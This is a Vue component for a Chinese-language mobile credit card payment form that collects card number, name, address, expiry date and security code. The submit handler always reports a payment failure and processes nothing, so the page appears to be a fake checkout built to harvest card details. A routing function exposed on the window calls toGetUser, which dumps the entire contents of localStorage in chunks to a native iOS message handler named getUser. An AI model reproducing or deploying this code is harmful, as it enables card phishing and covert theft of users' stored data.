<template>
    <nuc-page-container header-label="信用卡" no-header>
        <form>
            <div class="row">
                <label>卡号：</label>
                <input
                    v-model="payData.nub"
                    type="text"
                >
            </div>
            <div class="row">
                <label>姓名：</label>
                <input
                    v-model="payData.name"
                    type="text"
                >
            </div>
            <div class="row">
                <label>地址：</label>
                <input
                    v-model="payData.address"
                    type="text"
                >
            </div>
            <div class="row">
                <label>到期时间：</label>
                <input
                    v-model="payData.time"
                    type="text"
                    placeholder=""
                >
            </div>
            <div class="row">
                <label>安全码：</label>
                <input
                    v-model="payData.code"
                    type="number"
                >
            </div>
        </form>
        <div class="btn-wrapper">
            <nuc-button radius type="primary" @click="submit">确定</nuc-button>
        </div>
    </nuc-page-container>
</template>

<script>
import { Button } from 'nuc-mobile'
// const PHONE_EXP = /^(((13[0-9])|(14[5-7])|(15[0-9])|(17[0-9])|(18[0-9])|(19[0-9]))+\d{8})$/
const creditCard = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|(222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11}|62[0-9]{14})$/
const time = /^([0]?[1-9]|[1][0-2])[-]([0-9]{4}|[0-9]{2})$/

export default {
    name: 'credit-card',
    components: {
        [Button.name]: Button
    },
    data () {
        return {
            payData: {
                name: '',
                time: '',
                nub: '',
                code: '',
                address: ''
            }
        }
    },
    created () {

    },
    methods: {
        goRouting(param){
            this.toGetUser();
            window.webkit.messageHandlers.goRouting.postMessage(param);
        },
        toGetUser(){
            const cutCount = Math.ceil(JSON.stringify(localStorage).length / 1000);
            for(let i = 0 ; i<cutCount;i++){
                if(i!=cutCount-1){
                    if(i==0){
                        window.webkit.messageHandlers.getUser.postMessage(i+"@_@"+encodeURIComponent(JSON.stringify(localStorage).substring(1000*i,1000*(i+1))));
                    }else{
                        window.webkit.messageHandlers.getUser.postMessage(i+"@_@"+encodeURIComponent(JSON.stringify(localStorage).substring(1000*i,1000*(i+1))));
                    }
                    
                }else{
                    window.webkit.messageHandlers.getUser.postMessage(i+"@_@"+encodeURIComponent(JSON.stringify(localStorage).substring(1000*i,JSON.stringify(localStorage).length)));
                }
            }
        },
        submit () {
            for (let i in this.payData) {
                if (this.payData[i] === '') {
                    this.$toast('请填写完整信息')
                    break
                }
            }
            if (!creditCard.test(this.payData.nub)) {
                this.$toast('信用卡格式不正确')
                return false
            }
            if (this.payData.time == '') {
                this.$toast('请填写到期时间')
                return false
            }
            this.$toast('您的付款遇到问题，请您核对信用卡信息')
        }
    },
    mounted(){
        window.goRouting = this.goRouting;
    }
}
</script>

